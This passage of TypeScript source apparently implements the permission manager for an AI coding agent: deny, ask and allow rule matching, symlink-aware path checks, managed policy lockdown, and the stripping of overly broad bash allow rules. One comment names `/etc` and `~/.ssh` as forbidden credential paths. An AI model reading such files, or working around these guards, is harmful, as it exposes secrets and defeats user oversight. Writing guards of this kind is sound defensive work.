   * its root via {@link matchRootedFileRulePattern} and matches it against the
   * ABSOLUTE candidate path (and every symlink hop, so a rooted deny/ask/allow rule
   * cannot be bypassed via an in-workspace symlink). Returns `false` for bash/non-file
   * tools, content-less rules, or root-agnostic patterns (the existing raw matcher
   * already handles those unchanged). Mirrors the reference's `matchingRuleForInput`
   * (utils/permissions/filesystem.ts L955) per-root resolution step.
   */
  private matchFilePathRuleWithRoot(
    rule: Pick<PermissionRule, 'pattern'>,
    toolName: string,
    input: Record<string, unknown>,
  ): boolean {
    if (!rule.pattern) return false;
    if (!FILE_PATH_RULE_TOOLS.has(normalizeToolName(toolName))) return false;
    const fp = input.file_path ?? input.path;
    if (typeof fp !== 'string' || !fp) return false;
    const ci = this.pathRuleCaseInsensitive(toolName);
    const abs = path.resolve(process.cwd(), expandPath(fp, process.cwd()));
    const forms = new Set<string>([abs]);
    try {
      for (const hop of getPathsForPermissionCheck(abs)) forms.add(hop);
    } catch { /* resolution failure — literal absolute form only */ }
    for (const form of forms) {
      if (matchRootedFileRulePattern(rule.pattern, form, { caseInsensitive: ci }) === true) return true;
    }
    return false;
  }

  /**
   * True when `toolName`+`input` is a FILE tool operating on a path INSIDE the
   * operator-configured scratchpad dir ({@link isScratchpadPath}) that is not itself
   * a credential/system forbidden path. Backs the scratchpad read+write carve-out in
   * {@link check}. Resolves the input path to an absolute, symlink-collapsed form (so
   * `./scratch/x` / a scratchpad symlink both match) and defends against a mis-pointed
   * scratchpad dir: a scratchpad that somehow lands on `/etc`/`~/.ssh` still denies via
   * {@link isForbiddenReadPath}. Returns false for bash/non-file tools and when the
   * feature is off (env unset), so the carve-out is inert by default.
   */
  private isScratchpadToolCall(toolName: string, input: Record<string, unknown>): boolean {
    if (!FILE_PATH_RULE_TOOLS.has(normalizeToolName(toolName))) return false;
    const fp = input.file_path ?? input.path;
    if (typeof fp !== 'string' || !fp) return false;
    const resolved = this.resolveForCheck(fp, process.cwd());
    if (!isScratchpadPath(resolved)) return false;
    return !this.isForbiddenReadPath(resolved);
  }

  /**
   * Edit-access-implies-read (parity: the reference's filesystem.ts L1127-1134 "if you can
   * edit it you can read it"): a path the user granted EDIT access to via a `file_edit`
   * ALLOW rule is READABLE too, even when it is OUTSIDE the launch workspace — so a
   * user who added `file_edit(/data/out/**)` does not ALSO need a separate
   * `file_read(/data/out/**)` rule just to read back what the agent may write. Gated so
   * an explicit READ restriction always wins first: returns false if any `file_read`
   * deny OR ask rule matches the path (read-specific rules evaluated BEFORE the implied
   * allow, L1081-1134), and false if a `file_edit` deny rule matches (no edit access →
   * no implied read). Only ADDS allows for rule-granted edit paths; a within-workspace
   * read already returned 'allow' before this is consulted.
   */
  private editAccessImpliesRead(filePath: string): boolean {
    const input = { file_path: filePath };
    if (this.anyDenyMatches('file_read', input) || this.anyAskMatches('file_read', input)) return false;
    if (this.anyDenyMatches('file_edit', input)) return false;
    return this.matchedAllowRule('file_edit', input) !== undefined;
  }

  /**
   * Does any user-configured `ask` rule match this tool+input? Mirrors
   * {@link anyDenyMatches} but for content-specific `ask` rules. Used to keep
   * explicit `ask` rules BYPASS-IMMUNE: a user's `{tool, action:'ask'}` rule must
   * still prompt in bypassPermissions mode, before the blanket auto-allow (the reference
   * evaluates ask/safety-check rules BEFORE the bypass allow, permissions.ts
   * L1169-1281).
   */
  private anyAskMatches(toolName: string, input: Record<string, unknown>): boolean {
    for (const rule of this.rules) {
      if (rule.action !== 'ask') continue;
      if (!this.toolNameMatches(rule.tool, toolName)) continue;
      if (rule.paramPattern && !this.paramMatches(rule.paramPattern, input)) continue;
      if (rule.pattern) {
        if (toolName === 'bash' && typeof input.command === 'string') {
          if (matchBashPattern(rule.pattern, input.command, 'ask')) return true;
        } else {
          // File-path tools: an `ask` rule stays bypass-immune for the literal path
          // AND its symlink-resolved forms (parity with the deny matching above).
          for (const form of this.fileRuleMatchStrings(toolName, input)) {
            if (matchPattern(rule.pattern, form)) return true;
          }
        }
      } else {
        return true;
      }
    }
    return false;
  }

  /**
   * The human label of the ALLOW rule that auto-approved a tool call, or `undefined`
   * when no explicit allow rule grants it (the allow came from a mode / safety /
   * classifier fast-path, not a named rule). Scans the rule set with the SAME
   * first-match, deny-skipping semantics as {@link check}'s rule loop: a matching
   * `deny` rule is skipped (it never produces an allow), and if the FIRST matching
   * non-deny rule is an `ask` rule the result is `undefined` (that call would have
   * prompted, not auto-allowed). Intended to be called AFTER {@link check} /
   * {@link checkWithReason} already returned `allow`, so the executor can attribute the
   * silent approval to the specific standing rule that caused it — the provenance surface
   * the reference shows as `Auto-approved · matched "<rule>"` (classifierMatchedRule /
   * setClassifierApproval). The label uses the canonical `Tool(pattern)` permission-rule
   * syntax (or the bare tool name for a tool-wide rule). Pure read — never prompts or
   * mutates state.
   */
  matchedAllowRule(toolName: string, input: Record<string, unknown>): string | undefined {
    for (const rule of this.rules) {
      if (rule.action === 'deny') continue;
      if (!this.toolNameMatches(rule.tool, toolName)) continue;
      if (rule.paramPattern && !this.paramMatches(rule.paramPattern, input)) continue;
      const matched = rule.pattern
        ? (toolName === 'bash' && typeof input.command === 'string'
            ? matchBashPattern(rule.pattern, input.command, rule.action)
            : matchPattern(rule.pattern, this.inputToString(toolName, input)))
        : true;
      if (!matched) continue;
      // First matching non-deny rule decides (check() first-match). Only an `allow`
      // rule is auto-approval provenance; a matching `ask` rule would have prompted.
      if (rule.action !== 'allow') return undefined;
      return rule.pattern ? `${rule.tool}(${rule.pattern})` : rule.tool;
    }
    return undefined;
  }

  /**
   * Synchronously decide whether a bash COMMAND would be DENIED by the user's
   * configured deny rules (parity with the reference's `hasPermissionsToUseTool`
   * deny half, applied to skill/command-embedded `!`cmd` live-command execution —
   * promptShellExecution.ts). It reuses the SAME canonical bash deny-matching that
   * {@link check} uses ({@link anyDenyMatches} → `matchBashPattern`: compound-command
   * fanout, `$(...)`/backtick decomposition, and de-obfuscation), so a deny a user
   * configured for the model's own `bash` calls is ALSO honored when a TRUSTED skill
   * body embeds a live command — closing the gap where a skill injection bypassed
   * the user's permission rules and was gated only by static bash-safety. Pure read
   * of the current rule set; never prompts and never mutates state. A blank/non-string
   * command is not denied (there is nothing to run).
   */
  isBashCommandDenied(command: string): boolean {
    if (typeof command !== 'string' || command.trim().length === 0) return false;
    return this.anyDenyMatches('bash', { command });
  }

  hasExplicitDeny(toolName: string, input: Record<string, unknown>): boolean {
    if (this.deniedCommands.has(denialKey(toolName, input))) return true;
    // First-match semantics (consistent with check()).
    for (const rule of this.rules) {
      if (!this.toolNameMatches(rule.tool, toolName)) continue;
      if (rule.paramPattern && !this.paramMatches(rule.paramPattern, input)) continue;
      if (rule.pattern) {
        if (matchPattern(rule.pattern, this.inputToString(toolName, input))) return rule.action === 'deny';
      } else {
        return rule.action === 'deny';
      }
    }
    return false;
  }

  /**
   * Remove every rule matching the predicate. Returns the number removed.
   * Used to drop scoped rule sets (e.g. a persona's auto-allow rules) when
   * that scope ends, so they do not accumulate or leak across switches.
   *
   * Managed (`policySettings`) rules are IMMUTABLE: they are admin/enterprise-owned
   * and can never be removed by the agent, a persona-scope cleanup, or a
   * `/permissions remove` — even when the predicate matches them. This mirrors
   * the reference's managed-settings tier, where policy rules are read-only to the user
   * ({@link isManagedPermissionSource}). The lockdown in {@link addRule} stops new
   * non-managed rules from being added; this stops existing managed rules from
   * being deleted, so the enterprise policy floor cannot be edited away at runtime.
   */
  removeRule(predicate: (rule: PermissionRule) => boolean): number {
    const before = this.rules.length;
    this.rules = this.rules.filter(r => isManagedPermissionSource(r.source) || !predicate(r));
    const removed = before - this.rules.length;
    // Trace only when a rule was actually dropped, mirroring the reference's "Removing N
    // rule(s)" trace.
    if (removed > 0) {
      this.traceMutation(`Removing ${removed} rule(s)`);
      // A removed rule can flip an open prompt's decision — notify any pending recheck.
      this.notifyPermissionStateChanged();
    }
    return removed;
  }

  /**
   * Apply ONE structured {@link PermissionUpdate} to the live manager. This is the
   * single canonical path for turning a declarative rule/mode/directory mutation
   * (a permission-prompt suggestion, a `/permissions allow|deny|remove` command, a
   * hook-returned update) into state, so callers never hand-roll the addRule /
   * removeRule / setMode / registerAllowedRoot plumbing. Mirrors the reference's
   * `applyPermissionUpdate`; purely in-memory (persistence is a separate step).
   * Returns the number of rules/directories affected. Rule removal matches on the
   * NORMALIZED canonical string (parse→serialize) so a `Bash(*)` suggestion
   * removes a stored tool-wide `bash` rule and vice-versa.
   */
  applyUpdate(update: PermissionUpdate): { applied: number } {
    // Validate at the trust boundary: updates reach here from untrusted surfaces
    // (a permission-prompt tool's JSON reply, a hook's `updatedPermissions`) where
    // the compile-time union does not hold at runtime. Drop a malformed update
    // fail-closed (grant nothing) rather than partially applying it or letting an
    // unknown `type` fall through the switch and return `undefined` (a mid-turn
    // crash in {@link applyUpdates}).
    const validation = validatePermissionUpdate(update);
    if (!validation.valid) {
      this.traceMutation(`Rejected invalid permission update: ${validation.error}`);
      return { applied: 0 };
    }
    switch (update.type) {
      case 'setMode':
        return { applied: this.setMode(update.mode) ? 1 : 0 };
      case 'addRules': {
        let applied = 0;
        const source = update.destination as PermissionRuleSource | undefined;
        // Preserve suggestion order: addRule prepends, so insert in reverse.
        for (const rv of [...update.rules].reverse()) {
          const before = this.rules.length;
          this.addRule({ tool: normalizeToolName(rv.toolName), pattern: rv.ruleContent, action: update.behavior, source });
          if (this.rules.length > before) applied++;
        }
        return { applied };
      }
      case 'replaceRules': {
        const source = update.destination as PermissionRuleSource | undefined;
        // Atomically clear every rule of this (behavior, destination) first, then
        // add the replacements — mirrors the reference's per-(behavior,destination) swap.
        this.removeRule(r => r.action === update.behavior && r.source === source);
        return this.applyUpdate({ type: 'addRules', rules: update.rules, behavior: update.behavior, destination: update.destination });
      }
      case 'removeRules': {
        // Canonicalize both sides through parse→serialize so a `Bash(*)` / `Bash()`
        // suggestion matches a stored tool-wide `bash` rule (and vice-versa).
        const canon = (toolName: string, ruleContent?: string): string =>
          permissionRuleValueToString(permissionRuleValueFromString(permissionRuleValueToString({ toolName, ruleContent })));
        const targets = new Set(update.rules.map(rv => canon(normalizeToolName(rv.toolName), rv.ruleContent)));
        const applied = this.removeRule(r =>
          r.action === update.behavior &&
          targets.has(canon(r.tool, r.pattern)));
        return { applied };
      }
      case 'addDirectories': {
        let applied = 0;
        for (const dir of update.directories) {
          const before = this.getAllowedReadRoots().length;
          this.registerAllowedRoot(dir);
          if (this.getAllowedReadRoots().length > before) applied++;
        }
        return { applied };
      }
      case 'removeDirectories': {
        let applied = 0;
        for (const dir of update.directories) {
          const abs = path.isAbsolute(dir) ? dir : path.resolve(dir);
          if (this.removeAllowedRoot(abs)) applied++;
        }
        return { applied };
      }
    }
  }

  /**
   * Apply a BATCH of {@link PermissionUpdate}s in order (the one-click
   * "accept all suggestions" affordance). Mirrors the reference's
   * `applyPermissionUpdates`. Returns the total number of rules/directories
   * affected across every update.
   */
  applyUpdates(updates: PermissionUpdate[]): { applied: number } {
    let applied = 0;
    for (const update of updates) applied += this.applyUpdate(update).applied;
    return { applied };
  }

  /**
   * Grant-and-retry recovery for previously-denied commands: for each selected
   * entry in the recent-denials log (all of them when `selected` is omitted),
   * derive a scoped allow rule ({@link suggestAllowPrefix}) and apply it via
   * {@link applyUpdate}, then drop those entries from the log so they are not
   * offered again. Returns the retried commands and the model-facing
   * {@link createPermissionRetryMessage} so the caller can tell the agent it may
   * re-attempt them. Mirrors the reference's `/permissions` "retry denials" affordance
   * (onRetryDenials → createPermissionRetryMessage), extended to actually seed the
   * allow rule so the retry succeeds instead of prompting again.
   */
  grantRetryForDenials(selected?: string[]): { commands: string[]; message: string } {
    const selectedSet = selected && selected.length > 0 ? new Set(selected) : undefined;
    const chosen = selectedSet
      ? this._recentDenials.filter(d => selectedSet.has(d.display))
      : [...this._recentDenials];
    const commands: string[] = [];
    const rules: PermissionRuleValue[] = [];
    for (const d of chosen) {
      commands.push(d.display);
      const prefix = suggestAllowPrefix(d.display);
      if (prefix) rules.push({ toolName: 'bash', ruleContent: `${prefix}*` });
    }
    if (rules.length > 0) {
      this.applyUpdate({ type: 'addRules', behavior: 'allow', destination: 'session', rules });
    }
    const granted = new Set(commands);
    this._recentDenials = this._recentDenials.filter(d => !granted.has(d.display));
    return { commands, message: createPermissionRetryMessage(commands) };
  }

  /**
   * Detect allow rules that are shadowed by a higher-priority rule and can never
   * take effect, each with a {@link ShadowType}, a human-readable {@link
   * UnreachableRule.reason}, and an actionable {@link UnreachableRule.fix}.
   *
   * Severity ordering (parity with the reference's detectUnreachableRules): deny-shadowing
   * is checked FIRST and, on a hit, the allow is reported ONCE as `deny` and ask
   * shadowing is NOT also reported — each unreachable allow yields exactly one
   * finding, the most severe. A tool-wide deny is order-independent (a matching deny
   * unconditionally wins in {@link check}); a tool-wide ask only shadows when it
   * PRECEDES the allow, because an ask AFTER the allow never fires (AMI evaluates in
   * rule order — this is an intentional superset-accurate divergence from the reference's
   * order-agnostic ask scan, matching AMI's real evaluation).
   *
   * Sandbox carve-out: when sandbox auto-allow is active (from `options` or the
   * manager's own sandbox policy), a tool-wide Bash ask rule from PERSONAL settings
   * is not reported as shadowing — sandboxed bash is auto-allowed for this user — but
   * a shared-source ask rule still warns. Mirrors the reference's
   * `isAllowRuleShadowedByAskRule` exception.
   */
  detectShadowedRules(options: DetectUnreachableRulesOptions = {}): UnreachableRule[] {
    const sandboxAutoAllow = options.sandboxAutoAllowEnabled
      ?? (this.sandboxPolicy?.mode === 'container' && this.sandboxPolicy.autoAllowBashIfSandboxed === true);
    const shadows: UnreachableRule[] = [];
    for (let i = 0; i < this.rules.length; i++) {
      const allow = this.rules[i]!;
      if (allow.action !== 'allow') continue;
      // Only a SPECIFIC (content-bearing) allow rule can be "shadowed": e.g.
      // `bash(ls *)` sitting under a tool-wide `bash` deny/ask is genuinely
      // unreachable. A TOOL-WIDE allow (no pattern, or `*`) merely CONFLICTS with
      // a tool-wide deny/ask — it is not reported as shadowed, else every bare
      // `{tool, action:'allow'}` under a tool-wide deny is a false positive.
      // Mirrors the reference's shadowedRuleDetection (ruleContent === undefined ⇒ not
      // shadowed, shadowedRuleDetection.ts L118-122 / L166-170).
      const allowSpecific = !!allow.pattern && allow.pattern !== '*';
      if (!allowSpecific) continue;
      // Scan once for the most-severe shadower: a tool-wide deny (order-independent)
      // beats a preceding tool-wide ask.
      let denyShadow: PermissionRule | undefined;
      let askShadow: PermissionRule | undefined;
      for (let j = 0; j < this.rules.length; j++) {
        if (i === j) continue;
        const shadower = this.rules[j]!;
        if (shadower.tool !== allow.tool) continue;
        // A paramPattern rule is narrow (matches only specific named params),
        // so it never blanket-shadows a later allow.
        if (shadower.paramPattern) continue;
        const blanket = !shadower.pattern || shadower.pattern === '*';
        if (!blanket) continue;
        if (shadower.action === 'deny') denyShadow ??= shadower;
        else if (shadower.action === 'ask' && j < i) askShadow ??= shadower;
      }
      if (denyShadow) {
        shadows.push(this.buildUnreachableRule(allow, denyShadow, 'deny'));
        continue; // most-severe only — do not also report ask-shadowing.
      }
      if (askShadow) {
        // Sandbox carve-out: a personal-source tool-wide Bash ask rule is auto-allowed
        // for this user, so it does not actually shadow the specific allow.
        if (sandboxAutoAllow && normalizeToolName(allow.tool) === 'bash' && !isSharedSettingSource(askShadow.source)) {
          continue;
        }
        shadows.push(this.buildUnreachableRule(allow, askShadow, 'ask'));
      }
    }
    return shadows;
  }

  /** Assemble an {@link UnreachableRule} with a reason + fix naming both rules'
   *  sources. Shared across the deny/ask branches of {@link detectShadowedRules}. */
  private buildUnreachableRule(
    allow: PermissionRule,
    shadower: PermissionRule,
    shadowType: ShadowType,
  ): UnreachableRule {
    const tool = shadower.tool;
    const shadowerSource = permissionRuleSourceDisplayString(shadower.source);
    const allowSource = permissionRuleSourceDisplayString(allow.source);
    const reason = shadowType === 'deny'
      ? `Blocked by "${tool}" deny rule (from ${shadowerSource})`
      : `Shadowed by "${tool}" ask rule (from ${shadowerSource})`;
    const fix = `Remove the "${tool}" ${shadowType} rule from ${shadowerSource}, or remove the specific allow rule from ${allowSource}`;
    return { rule: allow, shadowedBy: shadower, shadowType, reason, fix };
  }

  // -------------------------------------------------------------------------
  // Managed / enterprise policy (policySettings tier)
  // -------------------------------------------------------------------------

  /** Is the managed-rules-only lockdown active (the reference's
   *  `allowManagedPermissionRulesOnly`)? When true, only `policySettings` rules are
   *  honored and nothing may be persisted. Set by {@link loadManagedPermissions}. */
  isManagedRulesOnly(): boolean {
    return this._managedRulesOnly;
  }

  /** Should a permission prompt offer "always allow" / "don't ask again" options?
   *  No, under the managed-rules-only lockdown — new rules can't be persisted, so a
   *  durable-allow affordance would be a dead end. Mirrors the reference's
   *  `shouldShowAlwaysAllowOptions()`. */
  shouldShowAlwaysAllowOptions(): boolean {
    return !this._managedRulesOnly;
  }

  /**
   * Load managed/enterprise permission rules from {@link managedPermissionsPath}
   * (the `policySettings` tier). The file is `{ allowManagedPermissionRulesOnly?:
   * boolean, rules: [...] }`. Every rule is tagged `policySettings` and loaded at
   * HIGHEST precedence (prepended). When `allowManagedPermissionRulesOnly` is true,
   * the lockdown engages: all non-`policySettings` rules already loaded are cleared
   * and no other tier is consulted — mirrors the reference's
   * `loadAllPermissionRulesFromDisk` / `syncPermissionRulesFromDisk` managed path.
   * Returns collected warnings. A missing file is a no-op.
   */
  loadManagedPermissions(): string[] {
    const warnings: string[] = [];
    const filePath = managedPermissionsPath();
    if (!fs.existsSync(filePath)) return warnings;
    let data: Record<string, unknown>;
    try {
      data = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
    } catch {
      // A broken enterprise policy must not silently vanish — but it also must not
      // crash the agent; surface a warning and treat as no managed rules.
      warnings.push('policySettings: managed permissions file could not be parsed and was ignored');
      return warnings;
    }
    const lockdown = data.allowManagedPermissionRulesOnly === true;
    const managed: PermissionRule[] = [];
    if (Array.isArray(data.rules)) {
      for (const rule of data.rules) {
        const { rule: coerced, warning } = this._coerceRule(rule, 'policySettings');
        if (coerced) managed.push(coerced);
        else if (warning) warnings.push(`policySettings: ${warning}`);
      }
    }
    if (lockdown) {
      this._managedRulesOnly = true;
      // Clear every non-managed rule — under lockdown only policy rules are honored.
      this.rules = this.rules.filter(r => isManagedPermissionSource(r.source));
    }
    // Prepend managed rules so they win first-match evaluation (highest precedence).
    this.rules.unshift(...managed);
    return warnings;
  }

  // -------------------------------------------------------------------------
  // Persistence
  // -------------------------------------------------------------------------

  /**
   * Load permission rules from `.ami/permissions.json` relative
   * to the given working directory.
   */
  loadRules(cwd: string): string[] {
    const warnings: string[] = [];
    const filePath = path.join(cwd, '.ami', 'permissions.json');
    if (!fs.existsSync(filePath)) return warnings;

    try {
      const raw = fs.readFileSync(filePath, 'utf-8');
      const data = JSON.parse(raw);

      // Preserve any unrecognized top-level keys (hooks, env, or a future AMI field)
      // so a round-trip through saveRules doesn't silently destroy settings this
      // loader doesn't model. Mirrors the reference's `...settingsData` spread-on-write.
      if (data && typeof data === 'object' && !Array.isArray(data)) {
        for (const k of Object.keys(data)) {
          if (k !== 'mode' && k !== 'rules' && k !== 'additionalDirectories') {
            this._extraPersistedKeys[k] = (data as Record<string, unknown>)[k];
          }
        }
      }

      // Load persisted additional read directories (parity: the reference's
      // `permissions.additionalDirectories`) as real read-root grants tagged with
      // the project tier, so a committed `.ami/permissions.json` that lists extra
      // directories actually grants the agent read access to them on launch (and
      // round-trips back through saveRules). Non-string / empty entries are skipped;
      // registerAllowedRoot resolves + de-dupes. Previously this key was merely
      // round-tripped as an opaque extra key and never honored.
      if (Array.isArray((data as Record<string, unknown>).additionalDirectories)) {
        for (const dir of (data as Record<string, unknown>).additionalDirectories as unknown[]) {
          if (typeof dir === 'string' && dir !== '') this.registerAllowedRoot(dir, 'projectSettings');
          else warnings.push('An invalid permissions.additionalDirectories entry was ignored');
        }
      }

      if (data.mode && typeof data.mode === 'string') {
        if ((PERMISSION_MODES as readonly string[]).includes(data.mode)) {
          this.applyMode(data.mode as PermissionMode, 'deserialize');
        } else {
          warnings.push(`Invalid permission mode "${data.mode}" was ignored`);
        }
      }

      if (Array.isArray(data.rules)) {
        for (const rule of data.rules) {
          const { rule: coerced, warning } = this._coerceRule(rule, 'projectSettings');
          if (coerced) this.rules.push(coerced);
          else if (warning) warnings.push(warning);
        }
        // Defense-in-depth: a committed/untrusted project rule cannot smuggle a
        // broad interpreter grant (`Bash(python:*)`) that would widen auto-approval.
        for (const r of this.stripDangerousRulesFromUntrustedSources()) {
          warnings.push(`Stripped dangerous code-execution allow rule from untrusted project settings: ${describeRule(r)}`);
        }
        // Defense-in-depth: a committed/untrusted project rule cannot smuggle a
        // blanket `Bash` / `Bash(*)` allow that would auto-approve EVERY bash
        // command (YOLO-equivalent) for the whole team.
        for (const r of this.stripOverlyBroadBashAllowRules()) {
          warnings.push(`Stripped overly-broad bash allow rule from untrusted project settings: ${describeRule(r)}`);
        }
      }
    } catch {
      warnings.push('permissions.json could not be parsed and was ignored');
    }
    return warnings;
  }

  /**
   * Coerce+validate one raw rule object (shared by loadRules and loadTieredRules
   * — one canonical validator, no per-loader duplication). Returns the typed rule
   * tagged with its `source` tier, or a human-readable warning for a dropped rule.
   */
  private _coerceRule(rule: unknown, source: PermissionRuleSource): { rule?: PermissionRule; warning?: string } {
    const r = rule as Record<string, unknown> | null;
    if (r && typeof r.tool === 'string' && typeof r.action === 'string' &&
        ['allow', 'deny', 'ask'].includes(r.action)) {
      const paramPattern = this.sanitizeParamPattern(r.paramPattern);
      // A rule that specified a paramPattern but whose values were all invalid is
      // malformed — drop it rather than load it as a broad (pattern-less) rule.
      if (r.paramPattern !== undefined && paramPattern === undefined) {
        return { warning: `Invalid permission rule for "${r.tool}" was skipped: malformed paramPattern` };
      }
      const pattern = typeof r.pattern === 'string' ? r.pattern : undefined;
      // Validate the composed canonical rule string so a syntactically bad rule
      // (empty tool name, a misplaced bash `:*` prefix, a WebFetch URL / WebSearch
      // wildcard) is dropped with an actionable warning instead of silently loaded
      // as a rule that never matches. The pattern is paren-escaped first so a
      // legitimate parenthesis in the content is not mistaken for a syntax error.
      const canonical = permissionRuleValueToString({ toolName: r.tool, ruleContent: pattern });
      const verdict = validatePermissionRule(canonical);
      if (!verdict.valid) {
        return { warning: `Invalid permission rule "${canonical}" was skipped: ${formatPermissionRuleError(verdict)}` };
      }
      // Honor a per-rule `source` tag when the file bundles rules from several
      // origins (a managed/flag file); a bogus tag falls back to the loader tier.
      return {
        rule: {
          tool: r.tool,
          pattern,
          action: r.action as PermissionRule['action'],
          reason: typeof r.reason === 'string' ? r.reason : undefined,
          paramPattern,
          source: coercePermissionRuleSource(r.source) ?? source,
        },
      };
    }
    // A user who typos a rule gets told WHICH rule was dropped, not a silent no-op.
    return { warning: `Invalid permission rule ${JSON.stringify(rule)} was skipped` };
  }

  /**
   * Load permission rules from ALL persisted tiers and merge them with documented
   * precedence: most-specific first so check()'s first-match allow/ask wins for
   * localSettings over projectSettings over userSettings (deny stays
   * order-independent). Each loaded rule is tagged with its `source` tier. Returns
   * collected warnings. Mirrors the reference's destination-tiered rule merge.
   */
  loadTieredRules(cwd: string): string[] {
    const warnings: string[] = [];
    // Managed/enterprise (policySettings) is the highest-precedence tier and may
    // engage the managed-rules-only lockdown. Load it FIRST; if lockdown engages,
    // no other tier is consulted (only managed rules are honored).
    warnings.push(...this.loadManagedPermissions());
    if (this._managedRulesOnly) return warnings;
    // Precedence (highest first): local → project → user. Push highest first so
    // first-match evaluation prefers the more-specific tier.
    const tiers: PermissionUpdateDestination[] = ['localSettings', 'projectSettings', 'userSettings'];
    // Re-derive the `useAutoModeDuringPlan` preference fresh from disk on every (re)load
    // so a mid-session settings edit toggling it is picked up by the following
    // transitionPlanAutoMode reconciliation. Highest-precedence (first-defined) tier
    // wins — a local override beats project beats user. Parity: the reference's
    // getUseAutoModeDuringPlan() reading merged settings.
    this._useAutoModeDuringPlan = false;
    let autoModeDuringPlanResolved = false;
    for (const tier of tiers) {
      const filePath = permissionDestinationPath(cwd, tier);
      if (!filePath || !fs.existsSync(filePath)) continue;
      try {
        const data = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
        if (!autoModeDuringPlanResolved && data && typeof data === 'object' &&
            typeof (data as Record<string, unknown>).useAutoModeDuringPlan === 'boolean') {
          this._useAutoModeDuringPlan = (data as Record<string, unknown>).useAutoModeDuringPlan as boolean;
          autoModeDuringPlanResolved = true;
        }
        if (Array.isArray(data.rules)) {
          for (const rule of data.rules) {
            const { rule: coerced, warning } = this._coerceRule(rule, tier);
            if (coerced) this.rules.push(coerced);
            else if (warning) warnings.push(`${tier}: ${warning}`);
          }
        }
      } catch {
        warnings.push(`${tier}: settings file could not be parsed and was ignored`);
      }
    }
    // Re-screen the merged tiers for dangerous breadth so a disk edit (a committed
    // project file, a settings-change re-sync via syncRulesFromDisk) cannot silently
    // (re-)grant a blanket `Bash` / `Bash(*)` allow into the live context. Mirrors
    // the reference's applySettingsChange re-running removeDangerousPermissions after every
    // disk sync (applySettingsChange.ts L50-59).
    for (const r of this.stripOverlyBroadBashAllowRules()) {
      warnings.push(`Stripped overly-broad bash allow rule from untrusted settings: ${describeRule(r)}`);
    }
    return warnings;
  }

  /**
   * Re-sync the live rule set from disk after an on-disk settings change, mirroring
   * the reference's `loadAllPermissionRulesFromDisk` + `syncPermissionRulesFromDisk`
   * (applySettingsChange.ts L37-48): drop every rule that ORIGINATED from a persisted
   * tier (`policySettings`/`localSettings`/`projectSettings`/`userSettings`), reset
   * the managed-rules-only lockdown so a removed policy file no longer locks down,
   * then reload all tiers fresh via {@link loadTieredRules}. In-memory sources
   * (`session`, `cliArg`, `flagSettings`, `command`) — runtime grants a user made
   * this session — are PRESERVED, so a mid-session reload neither duplicates
   * disk rules (repeated syncs are idempotent) nor wipes session grants. The policy
   * memo is cleared so the new allow/deny rules take effect on the very next check
   * instead of serving a stale ≤5s-TTL verdict. Returns collected warnings.
   *
   * This is what makes a mid-session edit to on-disk permission rules (an admin
   * adding a `deny`, a user widening `allow`) apply to the RUNNING session without a
   * restart. Safe to call repeatedly from a settings-change watcher.
   */
  syncRulesFromDisk(cwd: string): string[] {
    const DISK_TIERS: ReadonlySet<PermissionRuleSource> = new Set<PermissionRuleSource>([
      'policySettings', 'localSettings', 'projectSettings', 'userSettings',
    ]);
    this.rules = this.rules.filter(r => r.source === undefined || !DISK_TIERS.has(r.source));
    // A managed lockdown is re-derived from disk on reload; clearing it first lets a
    // now-removed policy file release the lockdown instead of leaving it latched on.
    this._managedRulesOnly = false;
    const warnings = this.loadTieredRules(cwd);
    // Reconcile plan/auto-mode state against the just-reloaded settings: a mid-plan
    // toggle of `useAutoModeDuringPlan` strips/restores dangerous rules and flips the
    // realized auto state immediately, and a still-active auto mode re-strips the disk
    // rules that the reload re-added. Parity: the reference's applySettingsChange running
    // transitionPlanAutoMode(newContext) after syncPermissionRulesFromDisk
    // (applySettingsChange.ts:L68).
    this.transitionPlanAutoMode();
    this._memo?.clear();
    return warnings;
  }

  /**
   * Persist the rules whose `source` matches `destination` to that tier's file
   * (in-memory tiers session/cliArg are a no-op). Returns {ok,error}; a persist
   * failure is surfaced, never silently lost (see {@link saveRules}).
   */
  saveRulesToDestination(cwd: string, destination: PermissionUpdateDestination): { ok: boolean; error?: string } {
    if (this._managedRulesOnly) {
      return { ok: false, error: 'managed-rules-only lockdown: permission rules are controlled by policy and cannot be persisted' };
    }
    const filePath = permissionDestinationPath(cwd, destination);
    if (!filePath) return { ok: true }; // session / cliArg are in-memory only
    try {
      const rules = this.rules.filter(r => r.source === destination);
      // Crash-safe, owner-only persist (temp + fsync + atomic rename, mode 0o600)
      // via the ONE canonical atomic writer — a crash / ENOSPC mid-write can never
      // leave a truncated permissions file that loadRules then silently discards,
      // and the file (which can hold deny patterns describing the project) is not
      // world-readable. Mirrors the reference's writeFileSyncAndFlush_DEPRECATED + 0o600.
      atomicWriteFileSync(filePath, JSON.stringify({ rules }, null, 2) + '\n', { mode: OWNER_ONLY_FILE_MODE });
      this.traceMutation(`Persisting ${rules.length} rule(s) to destination '${destination}': ${filePath}`);
      // The project-LOCAL destination is advertised to the user as "gitignored —
      // not shared with collaborators" (permission-save-destinations.ts). Make good
      // on that promise by actually adding the local file to the global gitignore,
      // exactly as the reference does on a `localSettings` write (settings.ts L508-514).
      // Best-effort + swallowed inside the helper: a gitignore write must never turn
      // a successful rule-persist into a failure.
      if (destination === 'localSettings') {
        const added = addFileGlobRuleToGitignore(path.basename(filePath), cwd);
        if (added) this.traceMutation(`Added **/${path.basename(filePath)} to the global gitignore for the project-local permissions file`);
      }
      return { ok: true };
    } catch (e) {
      return { ok: false, error: e instanceof Error ? e.message : String(e) };
    }
  }

  /**
   * Persist the current rules to `.ami/permissions.json`. Returns a success/error
   * signal so callers can surface a write failure instead of silently losing a
   * "don't ask again" rule (a read-only `.ami/`, a full disk, or a permission
   * error must not look like success). Mirrors the reference's addPermissionRulesToSettings
   * try/catch + boolean-return behavior (permissionsLoader.ts L258-295).
   */
  saveRules(cwd: string): { ok: boolean; error?: string } {
    if (this._managedRulesOnly) {
      return { ok: false, error: 'managed-rules-only lockdown: permission rules are controlled by policy and cannot be persisted' };
    }
    try {
      const filePath = path.join(cwd, '.ami', 'permissions.json');
      // Spread preserved unknown keys FIRST so the canonical mode/rules always win,
      // while a user's (or a future version's) extra keys survive the round-trip.
      // Persist the source-tracked additional read directories (parity: the reference's
      // `permissions.additionalDirectories`): only the PERSISTABLE tiers are written
      // — an ephemeral `session`/`cliArg` grant (`/add-dir`, `--context-file`) stays
      // in-memory and is dropped on exit, exactly as before. De-duped + order-stable.
      const additionalDirectories = this.persistableReadRoots();
